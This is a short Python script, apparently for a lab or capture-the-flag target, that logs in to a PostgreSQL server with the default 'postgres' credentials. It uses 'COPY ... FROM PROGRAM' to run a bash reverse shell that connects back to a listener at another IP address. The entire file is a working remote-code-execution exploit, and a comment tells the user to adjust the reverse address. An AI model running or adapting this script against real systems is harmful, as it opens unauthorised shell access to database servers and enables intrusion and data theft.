import psycopg2

host = '192.168.249.60'
port = 5432
user = 'postgres'
passw = 'postgres'

# Change the payload to correct reverse address
payload = "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i>& /dev/tcp/192.168.49.249/8080 0>&1\"';"


db_conn = psycopg2.connect(host=host, port=port, user=user, password=passw)
cur = db_conn.cursor()
cur.execute('DROP TABLE IF EXISTS cmd_exec;')
cur.execute('CREATE TABLE cmd_exec(cmd_output text);')
cur.execute(payload)
